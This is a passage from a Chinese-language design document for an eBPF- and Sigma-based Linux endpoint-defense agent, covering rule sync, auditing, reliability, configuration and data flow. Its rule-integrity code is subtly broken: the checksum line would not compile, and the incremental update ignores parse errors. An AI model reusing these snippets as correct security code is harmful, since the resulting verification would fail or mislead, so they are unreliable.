            Error:   err.Error(),
        }
    }
    
    // 返回结果
    resultJSON, _ := json.Marshal(result)
    return &ToolResponse{
        CallId:     req.CallId,
        Success:    true,
        ResultJson: string(resultJSON),
    }
}
```

### 9.4 规则接收

```go
// rule_receiver.go
package client

type RuleReceiver struct {
    ruleLoader *sigma.RuleLoader
}

func (r *RuleReceiver) UpdateRules(req *RuleUpdateRequest) *RuleUpdateResponse {
    if req.Action == "full_sync" {
        // 全量同步
        var rules []*sigma.Rule
        for _, rule := range req.Rules {
            parsed, err := sigma.ParseRule([]byte(rule.Content))
            if err != nil {
                continue
            }
            rules = append(rules, parsed)
        }
        r.ruleLoader.LoadAll(rules)
        
        return &RuleUpdateResponse{
            Success:      true,
            LoadedCount: int32(len(rules)),
        }
    } else {
        // 增量更新
        for _, rule := range req.Rules {
            parsed, _ := sigma.ParseRule([]byte(rule.Content))
            r.ruleLoader.ApplyUpdate(&sigma.RuleUpdate{
                Action: req.Action,
                RuleID: rule.RuleId,
                Rule:   parsed,
            })
        }
        
        return &RuleUpdateResponse{
            Success:      true,
            LoadedCount: int32(len(req.Rules)),
        }
    }
}
```

---

## 10. 监控模块

### 10.1 Agent指标

```go
// metrics.go
package monitor

type AgentMetrics struct {
    CPUUsage      float64 `json:"cpu_usage"`
    MemoryUsage   uint64  `json:"memory_usage"`
    EventCount    uint64  `json:"event_count"`
    RuleCount     int     `json:"rule_count"`
    Uptime        int64   `json:"uptime"`
    MatchedRules  uint64  `json:"matched_rules"`
    BlockExecuted uint64  `json:"block_executed"`
    BlockFailed   uint64  `json:"block_failed"`
    ToolCalls     uint64  `json:"tool_calls"`
}
```

### 10.2 审计日志

```go
// audit.go
package monitor

type AuditLog struct {
    Timestamp int64  `json:"timestamp"`
    Action    string `json:"action"`
    Target    string `json:"target"`
    Details   string `json:"details"`
    Result    string `json:"result"`
}

type AuditLogger struct {
    logFile string
    mu      sync.Mutex
}

func (l *AuditLogger) Record(action, target, details, result string) {
    l.mu.Lock()
    defer l.mu.Unlock()
    
    log := &AuditLog{
        Timestamp: time.Now().Unix(),
        Action:    action,
        Target:    target,
        Details:   details,
        Result:    result,
    }
    
    // 追加到日志文件
    l.append(log)
}
```

---

## 11. 可靠性设计

### 11.1 崩溃恢复

**systemd配置**：
```ini
[Unit]
Description=Aegis Agent
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/aegis-agent
Restart=always
RestartSec=5
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target
```

### 11.2 断连处理

```go
type Agent struct {
    eventBuffer *RingBuffer  // 本地事件缓冲（10000条）
    ruleCache   *RuleCache   // 本地规则缓存
    localMode   bool         // 本地模式标志
}

func (a *Agent) onDisconnect() {
    a.localMode = true
    // 使用本地缓存的规则继续工作
}

func (a *Agent) onReconnect() {
    // 批量上报缓冲的事件
    events := a.eventBuffer.ReadAll()
    a.client.BatchReport(events)
    
    // 同步最新规则
    a.ruleManager.SyncFromBackend()
    
    a.localMode = false
}
```

### 11.3 规则校验

```go
type RulePackage struct {
    Rules     []*Rule `json:"rules"`
    Signature string  `json:"signature"`
    Checksum  string  `json:"checksum"`
}

func (m *RuleManager) VerifyAndLoad(pkg *RulePackage) error {
    // 验证校验和
    expectedChecksum := sha256.Sum256([]byte(pkg.Rules))
    if hex.EncodeToString(expectedChecksum[:]) != pkg.Checksum {
        return fmt.Errorf("checksum mismatch")
    }
    
    // 验证签名
    if !verifySignature(pkg.Rules, pkg.Signature, m.publicKey) {
        return fmt.Errorf("signature verification failed")
    }
    
    return m.LoadRules(pkg.Rules)
}
```

---

## 12. 配置文件

### 12.1 配置文件格式

```toml
# /etc/aegis-agent/config.toml

# 后端gRPC地址
ServerAddr = "127.0.0.1:9090"

# 认证Token
AuthToken = "xxx"

# 主机ID
HostID = "xxx"

# eBPF配置
[ebpf]
# 事件缓冲区大小
BufferSize = 10000

# Sigma规则配置
[sigma]
# 本地规则缓存目录
RuleDir = "/etc/aegis-agent/rules"

# 阻断配置
[blocker]
# 隔离目录
QuarantineDir = "/var/quarantine"

# 监控配置
[monitor]
# 审计日志路径
AuditLogPath = "/var/lib/aegis-agent/audit_log.json"
```

---

## 13. 资源预算

| 资源 | 预算 | 说明 |
|:---|:---|:---|
| CPU | < 20% | eBPF + Sigma规则匹配 |
| 内存 | < 512MB | 事件缓冲 + 规则缓存 |
| 网络 | < 1Mbps | 事件上报 |
| 磁盘 | < 100MB | 日志 + 规则文件 + 隔离文件 |

---

## 14. 完整数据流

```
┌─────────────────────────────────────────────────────────────┐
│                    Agent                                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  eBPF采集所有事件（无过滤）                                │
│  • sched_process_exec (进程执行)                           │
│  • sched_process_fork (进程创建)                           │
│  • sched_process_exit (进程退出)                           │
│  • sys_enter_openat (文件访问)                             │
│  • sys_enter_connect (网络连接)                            │
│  • sys_enter_setuid/setgid/capset (权限变更)               │
│                                                             │
│  Sigma规则匹配（按logsource索引）                          │
│  • 命中 → 填充规则信息 → 上报Backend                      │
│  • 未命中 → 丢弃                                           │
│                                                             │
│  阻断执行                                                   │
│  • kill_process (杀死进程)                                 │
│  • quarantine_file (隔离文件，可回滚)                      │
│  • block_connection (阻断网络)                             │
│  • disable_user (禁用用户)                                 │
│  • revoke_permission (撤销权限)                            │
│                                                             │
│  工具暴露                                                   │
│  • get_process_tree (获取进程树)                           │
│  • get_network_connections (获取网络连接)                  │
│  • get_file_info (获取文件信息)                            │
│  • get_user_info (获取用户信息)                            │
│  • execute_command (执行命令，白名单限制)                  │
│                                                             │
│  可靠性                                                     │
│  • 崩溃恢复 (systemd自动重启)                              │
│  • 断连处理 (本地缓冲+重连批量上报)                        │
│  • 规则校验 (格式验证+完整性校验)                          │
│                                                             │
│  可观测性                                                   │
│  • Agent指标 (CPU/内存/事件数)                             │
│  • 审计日志 (阻断/工具调用)                                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

**文档结束**
